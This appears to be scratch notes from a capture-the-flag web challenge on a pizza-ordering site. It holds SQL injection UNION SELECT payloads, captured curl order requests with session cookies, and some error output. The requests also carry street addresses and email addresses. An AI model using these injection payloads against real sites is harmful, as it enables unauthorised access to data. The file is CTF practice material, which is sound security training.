# Last column is delivered status
' UNION SELECT 0,0,0 -- --
' UNION SELECT 0,0,1 -- --

curl 'https://pizza.hacktivity.h1ctf.com/order' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: */*' \
  -H 'DNT: 1' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: https://pizza.hacktivity.h1ctf.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://pizza.hacktivity.h1ctf.com/' \
  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
  -H 'Cookie: session=92a09afe6293f441dd1063b61fa6ab35' \
  --data-raw 'toppings%5B%5D=1&toppings%5B%5D=2&toppings%5B%5D=3&toppings%5B%5D=15&toppings%5B%5D=5&toppings%5B%5D=6&toppings%5B%5D=7&toppings%5B%5D=8&toppings%5B%5D=9&toppings%5B%5D=10&toppings%5B%5D=11&toppings%5B%5D=12&branch=3281&address%5Bline_1%5D=900+Pine+St&address%5Bline_2%5D=Apt+900&address%5Bline_3%5D=Door+on+the+left&address%5Bcity%5D=San+Francisco&address%5Bstate%5D=CA&address%5Bzipcode%5D=94109&email=pizza%40zoeyinthe.cloud&discount_code=' \
  --compressed


curl 'https://pizza.hacktivity.h1ctf.com/order' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: */*' \
  -H 'DNT: 1' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: https://pizza.hacktivity.h1ctf.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://pizza.hacktivity.h1ctf.com/' \
  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
  -H 'Cookie: session=19e60372558c97fc15ef812f998d1f95' \
  --data-raw 'branch=3281&address%5Bline_1%5D=925+Jones+Street&address%5Bline_2%5D=Apt+305&address%5Bline_3%5D=&address%5Bcity%5D=San+Francisco&address%5Bstate%5D=CA&address%5Bzipcode%5D=94109&email=zoeygarvey%40gmail.com&discount_code=' \
  --compressed

1159
No JSON object could be decoded

3306
No JSON object could be decoded

